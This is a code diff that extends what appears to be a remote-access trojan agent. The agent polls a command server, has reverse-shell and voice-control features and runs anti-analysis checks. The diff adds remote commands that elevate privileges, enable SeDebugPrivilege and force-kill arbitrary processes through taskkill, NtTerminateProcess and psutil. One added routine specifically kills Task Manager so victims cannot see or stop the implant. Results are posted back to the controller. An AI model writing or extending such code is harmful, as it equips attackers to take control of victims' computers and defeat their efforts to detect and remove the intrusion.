@@ -2594,6 +2594,7 @@ def main_loop(agent_id):
         "stop-reverse-shell": stop_reverse_shell,
         "start-voice-control": lambda: start_voice_control(agent_id),
         "stop-voice-control": stop_voice_control,
+        "kill-taskmgr": kill_task_manager,
     }
 
     while True:
@@ -2616,6 +2617,20 @@ def main_loop(agent_id):
             elif command.startswith("live-audio:"):
                 output = handle_live_audio(command.split(":", 1))
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+            elif command.startswith("terminate-process:"):
+                # Handle process termination with admin privileges
+                parts = command.split(":", 1)
+                if len(parts) > 1:
+                    process_target = parts[1]
+                    # Try to convert to int (PID) or use as string (process name)
+                    try:
+                        process_target = int(process_target)
+                    except ValueError:
+                        pass  # Keep as string (process name)
+                    output = terminate_process_with_admin(process_target, force=True)
+                else:
+                    output = "Invalid terminate-process command format"
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command != "sleep":
                 output = execute_command(command)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
@@ -2630,6 +2645,283 @@ def main_loop(agent_id):
                           CLIPBOARD_MONITOR_ENABLED or REVERSE_SHELL_ENABLED or
                           VOICE_CONTROL_ENABLED) else 5
         time.sleep(sleep_time)
+
+# --- Process Termination Functions ---
+
+def terminate_process_with_admin(process_name_or_pid, force=True):
+    """Terminate a process with administrative privileges."""
+    if not WINDOWS_AVAILABLE:
+        return terminate_linux_process(process_name_or_pid, force)
+    
+    try:
+        # First try to elevate if not already admin
+        if not is_admin():
+            print("Attempting to elevate privileges for process termination...")
+            if not elevate_privileges():
+                print("Could not elevate privileges. Trying alternative methods...")
+                return terminate_process_alternative(process_name_or_pid, force)
+        
+        # Method 1: Use taskkill with admin privileges
+        if isinstance(process_name_or_pid, str):
+            # Process name provided
+            cmd = ['taskkill', '/IM', process_name_or_pid]
+        else:
+            # PID provided
+            cmd = ['taskkill', '/PID', str(process_name_or_pid)]
+        
+        if force:
+            cmd.append('/F')
+        
+        # Add /T to terminate child processes
+        cmd.append('/T')
+        
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, 
+                                  creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
+            if result.returncode == 0:
+                return f"Process terminated successfully: {result.stdout}"
+            else:
+                print(f"Taskkill failed: {result.stderr}")
+                # Try alternative methods
+                return terminate_process_alternative(process_name_or_pid, force)
+        except Exception as e:
+            print(f"Taskkill command failed: {e}")
+            return terminate_process_alternative(process_name_or_pid, force)
+            
+    except Exception as e:
+        print(f"Process termination failed: {e}")
+        return f"Failed to terminate process: {e}"
+
+def terminate_process_alternative(process_name_or_pid, force=True):
+    """Alternative process termination methods using Windows API."""
+    if not WINDOWS_AVAILABLE:
+        return "Alternative termination not available on this platform"
+    
+    try:
+        # Method 1: Direct Windows API termination
+        if isinstance(process_name_or_pid, str):
+            # Find process by name
+            target_pids = []
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'].lower() == process_name_or_pid.lower():
+                    target_pids.append(proc.info['pid'])
+        else:
+            target_pids = [process_name_or_pid]
+        
+        if not target_pids:
+            return f"Process not found: {process_name_or_pid}"
+        
+        terminated_count = 0
+        for pid in target_pids:
+            if terminate_process_by_pid(pid, force):
+                terminated_count += 1
+        
+        if terminated_count > 0:
+            return f"Successfully terminated {terminated_count} process(es)"
+        else:
+            return "Failed to terminate any processes"
+            
+    except Exception as e:
+        return f"Alternative termination failed: {e}"
+
+def terminate_process_by_pid(pid, force=True):
+    """Terminate a specific process by PID using Windows API."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Method 1: Use TerminateProcess API
+        process_handle = win32api.OpenProcess(
+            win32con.PROCESS_TERMINATE | win32con.PROCESS_QUERY_INFORMATION,
+            False,
+            pid
+        )
+        
+        if process_handle:
+            try:
+                # Get process name for logging
+                try:
+                    process_name = win32process.GetModuleFileNameEx(process_handle, 0)
+                    print(f"Terminating process: {process_name} (PID: {pid})")
+                except:
+                    print(f"Terminating process PID: {pid}")
+                
+                # Terminate the process
+                win32api.TerminateProcess(process_handle, 1)
+                win32api.CloseHandle(process_handle)
+                
+                # Wait a moment and verify termination
+                time.sleep(0.5)
+                try:
+                    psutil.Process(pid)
+                    # Process still exists, try more aggressive methods
+                    return terminate_process_aggressive(pid)
+                except psutil.NoSuchProcess:
+                    # Process terminated successfully
+                    return True
+                    
+            except Exception as e:
+                win32api.CloseHandle(process_handle)
+                print(f"TerminateProcess failed for PID {pid}: {e}")
+                return terminate_process_aggressive(pid)
+        else:
+            print(f"Could not open process handle for PID {pid}")
+            return terminate_process_aggressive(pid)
+            
+    except Exception as e:
+        print(f"Process termination by PID failed: {e}")
+        return False
+
+def terminate_process_aggressive(pid):
+    """Aggressive process termination using advanced techniques."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Method 1: Use NtTerminateProcess (more direct)
+        try:
+            ntdll = ctypes.windll.ntdll
+            kernel32 = ctypes.windll.kernel32
+            
+            # Open process with maximum access
+            process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)  # PROCESS_ALL_ACCESS
+            if process_handle:
+                # Use NtTerminateProcess for more direct termination
+                status = ntdll.NtTerminateProcess(process_handle, 1)
+                kernel32.CloseHandle(process_handle)
+                
+                if status == 0:  # STATUS_SUCCESS
+                    print(f"Process {pid} terminated using NtTerminateProcess")
+                    return True
+        except Exception as e:
+            print(f"NtTerminateProcess failed: {e}")
+        
+        # Method 2: Debug privilege escalation and termination
+        try:
+            # Enable debug privilege
+            enable_debug_privilege()
+            
+            # Try termination again with debug privilege
+            process_handle = win32api.OpenProcess(
+                win32con.PROCESS_TERMINATE,
+                False,
+                pid
+            )
+            
+            if process_handle:
+                win32api.TerminateProcess(process_handle, 1)
+                win32api.CloseHandle(process_handle)
+                print(f"Process {pid} terminated with debug privilege")
+                return True
+                
+        except Exception as e:
+            print(f"Debug privilege termination failed: {e}")
+        
+        # Method 3: Use psutil as last resort
+        try:
+            proc = psutil.Process(pid)
+            proc.terminate()
+            proc.wait(timeout=3)
+            print(f"Process {pid} terminated using psutil")
+            return True
+        except psutil.TimeoutExpired:
+            try:
+                proc.kill()
+                print(f"Process {pid} killed using psutil")
+                return True
+            except:
+                pass
+        except Exception as e:
+            print(f"Psutil termination failed: {e}")
+        
+        return False
+        
+    except Exception as e:
+        print(f"Aggressive termination failed: {e}")
+        return False
+
+def enable_debug_privilege():
+    """Enable debug privilege for the current process."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Get current process token
+        token_handle = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(),
+            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
+        )
+        
+        # Get LUID for debug privilege
+        debug_privilege = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
+        
+        # Enable the privilege
+        privileges = [(debug_privilege, win32security.SE_PRIVILEGE_ENABLED)]
+        win32security.AdjustTokenPrivileges(token_handle, False, privileges)
+        
+        win32api.CloseHandle(token_handle)
+        print("Debug privilege enabled")
+        return True
+        
+    except Exception as e:
+        print(f"Failed to enable debug privilege: {e}")
+        return False
+
+def terminate_linux_process(process_name_or_pid, force=True):
+    """Terminate process on Linux systems."""
+    try:
+        if isinstance(process_name_or_pid, str):
+            # Use pkill for process name
+            cmd = ['pkill']
+            if force:
+                cmd.append('-9')  # SIGKILL
+            cmd.append(process_name_or_pid)
+        else:
+            # Use kill for PID
+            cmd = ['kill']
+            if force:
+                cmd.append('-9')  # SIGKILL
+            cmd.append(str(process_name_or_pid))
+        
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if result.returncode == 0:
+            return f"Process terminated successfully"
+        else:
+            return f"Process termination failed: {result.stderr}"
+            
+    except Exception as e:
+        return f"Linux process termination failed: {e}"
+
+def kill_task_manager():
+    """Specifically target and terminate Task Manager processes."""
+    if not WINDOWS_AVAILABLE:
+        return "Task Manager termination only available on Windows"
+    
+    try:
+        task_manager_processes = ['taskmgr.exe', 'Taskmgr.exe', 'TASKMGR.EXE']
+        results = []
+        
+        for process_name in task_manager_processes:
+            try:
+                result = terminate_process_with_admin(process_name, force=True)
+                results.append(f"{process_name}: {result}")
+            except Exception as e:
+                results.append(f"{process_name}: Failed - {e}")
+        
+        # Also try to find and kill by PID
+        try:
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'].lower() == 'taskmgr.exe':
+                    pid = proc.info['pid']
+                    result = terminate_process_with_admin(pid, force=True)
+                    results.append(f"PID {pid}: {result}")
+        except Exception as e:
+            results.append(f"PID search failed: {e}")
+        
+        return "\n".join(results)
+        
+    except Exception as e:
+        return f"Task Manager termination failed: {e}"
 
 if __name__ == "__main__":
     # Run anti-analysis checks first
